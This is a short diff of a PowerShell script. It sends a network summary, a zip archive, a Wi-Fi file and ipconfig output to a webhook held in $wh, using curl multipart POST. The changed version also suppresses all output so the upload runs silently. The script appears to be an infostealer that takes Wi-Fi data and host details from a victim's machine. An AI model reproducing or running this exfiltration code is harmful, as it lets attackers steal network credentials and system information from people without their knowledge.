@@ -38,11 +38,11 @@ $netInfoText = (Get-NetAdapter | ForEach-Object {
 $content = "Network summary:`n```$netInfoText```"
 
 
-curl.exe -X POST $wh `
-  -F "content=$content" `
-  -F file1=@"$zip" `
-  -F file2=@"$wifiFile" `
-  -F file3=@"$e\ipcfg.txt"
+$Body = @"
+content=$content
+"@
+
+curl.exe -X POST $wh -F @$Body -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null   
 
 # cleanup
 #cls
